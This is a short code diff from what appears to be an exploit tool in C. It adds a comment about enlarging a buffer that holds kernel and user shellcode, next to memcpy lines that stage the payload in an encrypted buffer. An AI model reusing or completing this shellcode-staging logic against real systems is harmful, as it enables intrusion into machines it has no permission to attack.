@@ -294,6 +294,9 @@ int main(int argc, char* argv[])
 	//copy payload shellcode to encrypted buffer at the APPROPRIATE location ( +4 after kernel shellcode size )
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
 	*/
+	/*
+	Because of this, the buffer holding the kernel and user shellcode must be extended by +4 to accomodate the DWORD value.
+	*/
 	
 	//copy payload shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size, shellcode, payload_shellcode_size);
